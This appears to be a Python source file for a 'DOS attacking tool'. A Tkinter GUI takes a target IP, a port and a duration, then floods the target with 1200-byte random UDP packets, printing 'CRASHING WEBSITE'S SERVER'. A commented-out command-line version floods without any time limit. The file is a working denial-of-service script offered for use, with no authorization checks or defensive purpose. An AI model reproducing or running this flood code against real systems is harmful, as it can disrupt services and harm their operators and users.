# dos-attack-hacking-tool
'''this is a tool for dos attack made in python in gui mode but if it not responds you can also use the cli mode of it
please run the below code in your python
modules required :
tkinter,socket,random,time,pillow,tkinter.messagebox
'''
#TOOL FOR DOS ATTACK
#TOOL FOR DOS ATTACK
from tkinter import *
from PIL import Image, ImageTk
import tkinter.messagebox as tmsg
root = Tk()
def about():
    tmsg.showinfo("ABOUT ME","I AM NISHKARSH A PROFESSIONAL ETHICAL HACKER AND CYBER SECURITY EXPERT THIS IS A DOS ATTACKING TOOL MADE BY ME ON 04-09-2020 WITH THE HELP OF PYTHON PROGRAMMING.")
    
root.geometry("707x600")
root.title("DOS ATTACKING TOOL")
b = Menu(root)
b.add_command(label="ABOUT ME",command=about)
root.config(menu=b)
image = Image.open("C:/Users/Simran Bains/Downloads/wanna.jpg")
photo = ImageTk.PhotoImage(image)
l = Label(image=photo)
l.pack()
a = StringVar()
i = Label(text="TARGET :",font="lucida 13 bold",fg="red")
i.pack(anchor="w")
p = Entry(root,textvariable=a,font="lucida 10 bold",fg="black",borderwidth=7,relief=SUNKEN,bg="red")
p.pack(anchor="w")
b = IntVar()
ip = Label(text="PORT:",font="lucida 13 bold",fg="red")
ip.pack(anchor="w")
gt = Entry(root,textvariable=b,font="lucida 10 bold",fg="black",borderwidth=7,relief=SUNKEN,bg="red")
gt.pack(anchor="w")
c = IntVar()
io = Label(text="DURATION:",font="lucida 13 bold",fg="red")
io.pack(anchor="w")
gto = Entry(textvariable=c,font="lucida 10 bold",fg="black",borderwidth=7,relief=SUNKEN,bg="red")
gto.pack(anchor="w")
def attack():
    #CODE FOR SENDING PACKETS TO THE SERVER
    import socket
    import random
    import time
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1200)
    ip = a.get()
    port = b.get()
    duration = c.get()
    timeout = time.time() + duration
    sent = 0
    while(time.time()<timeout):
        try:
           sock.sendto(bytes,(ip, port))
           sent = sent+1
           print("CRASHING WEBSITE'S SERVER")
        except:
            a.set("INVALID URL")
            b.set("")
            c.set("")
            p.update()
            break
but = Button(text="ATTACK",fg="red",font="lucida 15 bold",bg="black",command=attack,padx=30)
but.pack(side="top")
root.mainloop()

#IF THE GUI NOT RESPONDS , THE CLI VERSION IS BELOW
'''import socket
import random
import time
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1200)
ip = input('target :')
port = int(input("port:"))
duration = int(input('number of seconds:'))
timeout = time.time() + duration
sent = 0
while(True):
  sock.sendto(bytes,(ip, port))
  sent = sent+1
  print("sending packet")'''


